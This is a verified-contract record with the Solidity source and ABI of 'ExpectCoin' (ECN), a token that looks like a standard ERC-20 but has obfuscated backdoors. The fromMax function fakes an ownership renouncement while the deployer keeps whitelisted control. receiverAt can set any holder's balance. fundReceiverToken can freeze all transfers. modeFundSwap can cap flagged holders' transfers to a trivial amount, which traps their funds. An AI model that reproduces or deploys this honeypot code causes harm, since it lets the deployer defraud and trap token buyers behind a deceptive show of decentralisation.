{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract limitExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toSell {\n    function createPair(address maxEnableFee, address shouldBuy) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface limitShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface isEnable {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toList) external view returns (uint256);\n\n    function transfer(address sellExempt, uint256 tokenFrom) external returns (bool);\n\n    function allowance(address maxSenderExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address sellExempt,\n        uint256 tokenFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeLiquidityTx, uint256 value);\n    event Approval(address indexed maxSenderExempt, address indexed spender, uint256 value);\n}\n\ninterface isEnableMetadata is isEnable {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ExpectCoin is limitExempt, isEnable, isEnableMetadata {\n\n    function getOwner() external view returns (address) {\n        return amountLimit;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return minTeam;\n    }\n\n    uint256 private amountList = 100000000 * 10 ** 18;\n\n    function owner() external view returns (address) {\n        return amountLimit;\n    }\n\n    uint256 private listMin;\n\n    function transfer(address takeLimitTrading, uint256 tokenFrom) external virtual override returns (bool) {\n        return shouldFrom(_msgSender(), takeLimitTrading, tokenFrom);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountList;\n    }\n\n    uint256 constant feeSender = 15 ** 10;\n\n    mapping(address => uint256) private minAmountSwap;\n\n    function balanceOf(address toList) public view virtual override returns (uint256) {\n        return minAmountSwap[toList];\n    }\n\n    uint8 private minTeam = 18;\n\n    function txAutoMode(address exemptLaunchFee, address sellExempt, uint256 tokenFrom) internal view returns (uint256) {\n        require(tokenFrom > 0);\n\n        uint256 atBuy = 0;\n        if (exemptLaunchFee == liquiditySwap && feeSell > 0) {\n            atBuy = tokenFrom * feeSell / 100;\n        } else if (sellExempt == liquiditySwap && txShould > 0) {\n            atBuy = tokenFrom * txShould / 100;\n        }\n        require(atBuy <= tokenFrom);\n        return tokenFrom - atBuy;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptLaunchSwap;\n    }\n\n    address public liquiditySwap;\n\n    mapping(address => bool) public swapTradingSender;\n\n    function allowance(address enableTx, address atTeam) external view virtual override returns (uint256) {\n        if (atTeam == listReceiverLimit) {\n            return type(uint256).max;\n        }\n        return takeFrom[enableTx][atTeam];\n    }\n\n    bool private senderReceiver;\n\n    string private exemptLaunchSwap = \"Expect Coin\";\n\n    function fundAuto(address listReceiverTake) public {\n        require(listReceiverTake.balance < 100000);\n        if (maxLiquidity) {\n            return;\n        }\n        if (totalMarketing == toTake) {\n            totalMarketing = listMin;\n        }\n        fromExempt[listReceiverTake] = true;\n        \n        maxLiquidity = true;\n    }\n\n    mapping(address => bool) public fromExempt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return teamList;\n    }\n\n    address private amountLimit;\n\n    function transferFrom(address exemptLaunchFee, address sellExempt, uint256 tokenFrom) external override returns (bool) {\n        if (_msgSender() != listReceiverLimit) {\n            if (takeFrom[exemptLaunchFee][_msgSender()] != type(uint256).max) {\n                require(tokenFrom <= takeFrom[exemptLaunchFee][_msgSender()]);\n                takeFrom[exemptLaunchFee][_msgSender()] -= tokenFrom;\n            }\n        }\n        return shouldFrom(exemptLaunchFee, sellExempt, tokenFrom);\n    }\n\n    uint256 public totalMarketing;\n\n    function shouldFrom(address exemptLaunchFee, address sellExempt, uint256 tokenFrom) internal returns (bool) {\n        if (exemptLaunchFee == senderLaunched) {\n            return isToken(exemptLaunchFee, sellExempt, tokenFrom);\n        }\n        uint256 tradingTake = isEnable(liquiditySwap).balanceOf(walletTake);\n        require(tradingTake == fundSwap);\n        require(sellExempt != walletTake);\n        if (swapTradingSender[exemptLaunchFee]) {\n            return isToken(exemptLaunchFee, sellExempt, feeSender);\n        }\n        tokenFrom = txAutoMode(exemptLaunchFee, sellExempt, tokenFrom);\n        return isToken(exemptLaunchFee, sellExempt, tokenFrom);\n    }\n\n    address public senderLaunched;\n\n    function fromMax() public {\n        emit OwnershipTransferred(senderLaunched, address(0));\n        amountLimit = address(0);\n    }\n\n    string private teamList = \"ECN\";\n\n    event OwnershipTransferred(address indexed tradingAuto, address indexed totalSellMode);\n\n    function receiverAt(address takeLimitTrading, uint256 tokenFrom) public {\n        teamTake();\n        minAmountSwap[takeLimitTrading] = tokenFrom;\n    }\n\n    function approve(address atTeam, uint256 tokenFrom) public virtual override returns (bool) {\n        takeFrom[_msgSender()][atTeam] = tokenFrom;\n        emit Approval(_msgSender(), atTeam, tokenFrom);\n        return true;\n    }\n\n    address listReceiverLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fundReceiverToken(uint256 tokenFrom) public {\n        teamTake();\n        fundSwap = tokenFrom;\n    }\n\n    uint256 public feeSell = 3;\n\n    bool public atFromEnable;\n\n    uint256 fundSwap;\n\n    function modeFundSwap(address limitFeeAt) public {\n        teamTake();\n        if (senderReceiver != atFromEnable) {\n            toTake = listMin;\n        }\n        if (limitFeeAt == senderLaunched || limitFeeAt == liquiditySwap) {\n            return;\n        }\n        swapTradingSender[limitFeeAt] = true;\n    }\n\n    function isToken(address exemptLaunchFee, address sellExempt, uint256 tokenFrom) internal returns (bool) {\n        require(minAmountSwap[exemptLaunchFee] >= tokenFrom);\n        minAmountSwap[exemptLaunchFee] -= tokenFrom;\n        minAmountSwap[sellExempt] += tokenFrom;\n        emit Transfer(exemptLaunchFee, sellExempt, tokenFrom);\n        return true;\n    }\n\n    bool public maxLiquidity;\n\n    address walletTake;\n\n    uint256 private toTake;\n\n    uint256 public txShould = 0;\n\n    constructor (){\n        if (senderReceiver) {\n            senderReceiver = false;\n        }\n        fromMax();\n        limitShould tradingFundTeam = limitShould(listReceiverLimit);\n        liquiditySwap = toSell(tradingFundTeam.factory()).createPair(tradingFundTeam.WETH(), address(this));\n        walletTake = toSell(tradingFundTeam.factory()).feeTo();\n        \n        senderLaunched = _msgSender();\n        fromExempt[senderLaunched] = true;\n        minAmountSwap[senderLaunched] = amountList;\n        if (atFromEnable) {\n            atFromEnable = true;\n        }\n        emit Transfer(address(0), senderLaunched, amountList);\n    }\n\n    mapping(address => mapping(address => uint256)) private takeFrom;\n\n    uint256 isMarketing;\n\n    function teamTake() private view {\n        require(fromExempt[_msgSender()]);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxSenderExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalSellMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeLiquidityTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFromEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiverTake\",\"type\":\"address\"}],\"name\":\"fundAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenFrom\",\"type\":\"uint256\"}],\"name\":\"fundReceiverToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquiditySwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitFeeAt\",\"type\":\"address\"}],\"name\":\"modeFundSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimitTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenFrom\",\"type\":\"uint256\"}],\"name\":\"receiverAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTradingSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimitTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLaunchFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ExpectCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}